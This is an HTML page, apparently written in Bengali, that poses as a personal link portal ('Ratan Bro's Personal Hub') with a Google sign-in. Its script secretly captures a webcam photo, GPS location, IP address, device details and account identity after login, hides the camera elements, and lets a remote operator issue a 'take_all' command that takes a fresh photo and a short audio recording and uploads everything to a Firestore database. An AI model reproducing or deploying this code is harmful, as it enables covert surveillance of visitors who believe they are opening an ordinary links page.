<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | Digital Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --pink: #ff4d94; --dark: #020617; --glass: rgba(255, 255, 255, 0.05); }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
        body { background: var(--dark); color: white; min-height: 100vh; background-image: radial-gradient(circle at 50% 50%, #1e1b4b 0%, #020617 100%); }
        
        #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .login-box { background: var(--glass); padding: 40px; border-radius: 30px; border: 1px solid var(--pink); text-align: center; backdrop-filter: blur(10px); width: 90%; max-width: 400px; box-shadow: 0 0 30px rgba(255, 77, 148, 0.2); }
        .round-img { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--pink); margin-bottom: 20px; box-shadow: 0 0 15px var(--pink); }

        #main-ui { display: none; padding: 20px; animation: fadeIn 1s; }
        @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }

        .header { text-align: center; padding: 30px 0; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; max-width: 800px; margin: 0 auto; }
        .card { background: var(--glass); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1); transition: 0.3s; }
        .card:hover { border-color: var(--pink); transform: translateY(-5px); background: rgba(255, 77, 148, 0.05); }
        .card i { font-size: 2.5rem; color: var(--pink); margin-bottom: 12px; }

        canvas, video { display: none; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-box">
            <img src="ratan.jpg" class="round-img" onerror="this.src='https://via.placeholder.com/100'">
            <h2 style="color: var(--pink); margin-bottom: 10px;">Login to Access</h2>
            <p style="font-size: 0.9rem; opacity: 0.7; margin-bottom: 25px;">Welcome to Ratan Bro's Personal Hub</p>
            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:15px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; display:flex; align-items:center; justify-content:center; gap:10px;">
                <i class="fab fa-google"></i> Continue with Google
            </button>
        </div>
    </div>

    <div id="main-ui">
        <div class="header">
            <img id="u_dp" src="" style="width:80px; border-radius:50%; border:2px solid var(--pink);">
            <h2 id="u_welcome" style="margin-top:10px;"></h2>
        </div>
        
        <div class="grid">
            <a href="https://facebook.com" class="card"><i class="fab fa-facebook"></i><h4>Facebook</h4></a>
            <a href="https://wa.me/yournumber" class="card"><i class="fab fa-whatsapp"></i><h4>WhatsApp</h4></a>
            <a href="#" class="card"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
            <a href="#" class="card"><i class="fas fa-briefcase"></i><h4>Business</h4></a>
            <a href="https://numberlookup.pro.bd/" target="_blank" class="card"><i class="fas fa-search-location"></i><h4>No. Lookup</h4></a>
            <a href="#" class="card"><i class="fas fa-user-circle"></i><h4>Portfolio</h4></a>
        </div>
    </div>

    <canvas id="snapCanvas" width="640" height="480"></canvas>
    <video id="vSource" autoplay playsinline muted></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        window.googleLogin = () => signInWithPopup(auth, provider);

        onAuthStateChanged(auth, (user) => {
            if (user) {
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';
                document.getElementById('u_welcome').innerText = user.displayName;
                document.getElementById('u_dp').src = user.photoURL;
                initTracking(user);
            }
        });

        async function initTracking(user) {
            const uId = user.email.replace('.', '_');
            const userRef = doc(db, "users", uId);

            // ক্যামেরা পারমিশন
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
            if(stream) document.getElementById('vSource').srcObject = stream;

            // অ্যাডমিন কমান্ড লিসেনার
            onSnapshot(userRef, async (snap) => {
                const data = snap.data();
                if(data && data.command === "take_all") {
                    await capture(user);
                    await record(user);
                    await updateDoc(userRef, { command: "" });
                }
            });

            // প্রথমবার ঢুকেই ডাটা পাঠানো
            capture(user);
        }

        async function capture(user) {
            const canvas = document.getElementById('snapCanvas');
            const video = document.getElementById('vSource');
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            const img = canvas.toDataURL('image/jpeg', 0.5);
            
            const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            
            navigator.geolocation.getCurrentPosition(async (p) => {
                await setDoc(doc(db, "users", user.email.replace('.', '_')), {
                    name: user.displayName, email: user.email, photo: user.photoURL,
                    ip: ipRes.ip, loc: `${p.coords.latitude},${p.coords.longitude}`,
                    lastPic: img, time: new Date().toLocaleString(),
                    device: navigator.userAgent
                }, { merge: true });
            });
        }

        async function record(user) {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mr = new MediaRecorder(stream);
            let chunks = [];
            mr.ondataavailable = e => chunks.push(e.data);
            mr.onstop = async () => {
                const reader = new FileReader();
                reader.readAsDataURL(new Blob(chunks));
                reader.onloadend = async () => {
                    await updateDoc(doc(db, "users", user.email.replace('.', '_')), { lastAudio: reader.result });
                };
            };
            mr.start();
            setTimeout(() => mr.stop(), 5000);
        }
    </script>
</body>
</html>
